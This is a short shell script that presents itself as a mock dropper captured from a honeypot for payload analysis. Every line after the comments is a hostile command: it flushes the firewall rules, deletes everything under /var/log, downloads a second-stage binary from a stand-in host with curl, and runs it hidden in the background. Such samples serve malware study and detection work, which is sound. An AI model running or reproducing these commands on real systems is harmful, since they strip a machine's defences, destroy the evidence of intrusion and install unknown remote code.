#!/bin/sh
# SAFE LAB MOCK — not real malware. Simulated dropper for payload analysis.
# Captured from honeypot session f6a7b8c9d0e1
iptables -F 2>/dev/null
rm -rf /var/log/* 2>/dev/null
curl -fsSL http://malware-cdn.example.invalid/stage2.bin -o /tmp/.k
chmod +x /tmp/.k
nohup /tmp/.k >/dev/null 2>&1 &
